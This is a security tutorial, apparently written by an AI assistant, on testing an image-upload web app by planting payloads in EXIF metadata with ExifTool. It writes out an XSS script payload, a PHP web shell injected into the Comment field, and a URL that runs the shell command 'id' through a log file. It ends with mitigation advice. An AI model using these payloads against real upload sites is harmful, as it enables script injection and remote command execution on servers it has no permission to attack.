
# ExifTool Sample Scenario + Methology 

### **Scenario: Example Vulnerable Web Application**

Let’s assume you’ve found a website that allows users to **upload images**. The app might display images along with metadata (e.g., description or comments) extracted from the image's EXIF data.

#### **Example Web Application:**
- **URL**: `http://example.com/upload`
- **Functionality**: The website allows users to upload images and displays them in a gallery. Each image has associated metadata (e.g., `Comment`, `Description`, `Title`) which is extracted from the image and displayed as an image caption or description.

---

### **Step-by-Step Walkthrough:**

#### **1. Inspect the Image Metadata Using `ExifTool`**
Let’s say you have an image with the following metadata:
```bash
$ exiftool myimage.jpg
...
Comment                         : This is a squirrel!
```

---

#### **2. Upload the Image to the Web Application**
You upload `myimage.jpg` to `http://example.com/upload` (or the relevant upload page). After uploading, the app might display something like:
```html
<img src="/uploads/myimage.jpg" alt="This is a squirrel!">
```

At this point, **nothing malicious has happened yet** because the app is simply showing the metadata (`Comment`) as the `alt` text, and there’s no injection or processing involved.

---

#### **3. Test for Unsanitized Metadata with Malicious Payloads**
Next, you want to see if the app allows injection of malicious data into the metadata. You modify the image's metadata using `ExifTool`:

```bash
exiftool -Comment='"><script>alert("XSS")</script>' myimage.jpg
```

Now, when you upload this image to the same application, it might insert the `alt` attribute with the injected script like so:

```html
<img src="/uploads/myimage.jpg" alt=""><script>alert("XSS")</script>">
```

This would trigger **XSS** if the app does not sanitize the metadata before rendering it in the HTML.

---

### **4. Look for Logging or Processing of Metadata (Signs of RCE Vulnerability)**

Now let’s consider the possibility that the app is logging or processing the metadata in an unsafe way. Here's how to identify if the app might be vulnerable to **Remote Code Execution (RCE)**:

#### **A. Look for Application Logs or Error Messages**
- Check if the application produces error messages or displays **logs** that could indicate it's logging metadata.
  - Example: You might see an admin panel or debug screen showing something like:
    ```bash
    [INFO] Image uploaded: myimage.jpg
    [INFO] Metadata extracted: Comment: <?php system($_GET["cmd"]); ?>
    ```
  - If you see that the app is extracting and logging metadata, it’s a sign that the metadata is stored and possibly executed somewhere.

#### **B. Inspect for Admin Panel or Debugging Logs**
Check if there is an **admin panel** or any place where logs are displayed. Sometimes, web apps log uploads for auditing or debugging purposes. These logs could store metadata, and if not sanitized, could lead to code execution vulnerabilities.

For example:
- The app might save the metadata to a file on the server, e.g., `uploads.log` or `metadata.log`.
- Check if these log files are accessible:
  - **Try accessing logs directly** (if public):  
    ```
    http://example.com/logs/uploads.log
    ```
    Or, if there’s a known path for logs (like `/var/www/html/logs/`), try finding any logs there.

#### **C. Test for Web Shell in Metadata**
If you believe the app logs metadata unsafely, you could inject a **PHP web shell** into the `-Comment` field and see if the app executes it. Use `ExifTool` to inject the following payload into the metadata:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' myimage.jpg
```

Now, when you upload the image, the app might log or process the `-Comment` metadata and save it in a **file** or **database**. If this metadata is stored and executed by the app later (either by a file reader or server-side script), an attacker could trigger a **Remote Code Execution**.

For example, if the app saves metadata to a file like `uploads.log` and then executes the logs as PHP, you could access the following URL to execute arbitrary commands:
```
http://example.com/logs/uploads.log?cmd=id
```
This would execute the PHP code in the metadata (e.g., `system($_GET["cmd"])`) and display the result of the `id` command.

---

### **5. Conclusion and Mitigation Steps**

If you can inject a PHP payload into the metadata and trigger **RCE** by accessing a log file or processed data, the application is vulnerable to **remote code execution**.

#### **Signs of Potential RCE Vulnerability:**
- The app extracts and logs metadata (like `Comment`, `Description`, etc.).
- Metadata is saved to a file or database without proper sanitization.
- The app executes metadata directly or stores it in logs that are later processed.

#### **Mitigation Steps:**
1. **Sanitize Metadata**: Never store or display raw user input without sanitizing it (e.g., escaping dangerous characters).
2. **Secure Logs**: Make sure logs cannot be executed as scripts. Log files should be stored outside of the web root.
3. **Avoid Direct Execution of Metadata**: Don't use user-controlled data (like metadata) in shell commands or execution contexts without proper validation and escaping.

---

This example illustrates how **unsanitized metadata** can be exploited for **XSS** or **RCE attacks**, especially if it's logged or processed unsafely. Let me know if you'd like a more detailed example or help with testing this on a safe platform!
